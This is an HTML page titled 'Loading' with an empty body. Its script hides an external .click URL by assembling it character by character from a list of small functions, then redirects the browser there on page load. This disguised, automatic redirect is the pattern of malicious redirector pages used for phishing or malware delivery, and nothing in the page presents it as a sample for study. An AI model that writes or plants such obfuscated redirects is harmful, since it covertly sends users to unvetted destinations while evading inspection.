<!DOCTYPE html>
<html>
<head>
    <title>Loading</title>
    <script>
        const parts = [
            () => 'h',
            _ => 't',
            _ => 't',
            () => 'p',
            () => 's',
            _ => ':',
            _ => '/',
            _ => '/',
            _ => 'v',
            function() { return 'e'; },
            _ => 'r',
            _ => 'g',
            function() { return 'e'; },
            _ => 'n',
            function() { return '.'; },
            function() { return 'c'; },
            _ => 'l',
            _ => 'i',
            _ => 'c',
            () => 'k',
            function() { return '/'; },
            function() { return 's'; },
            _ => '/',
            _ => 'n',
            function() { return 'e'; },
            _ => 'w'
        ];
        const url = parts.reduce((acc, fn) => acc + fn(), '');
        document.location = url;
    </script>
</head>
<body></body>
</html>
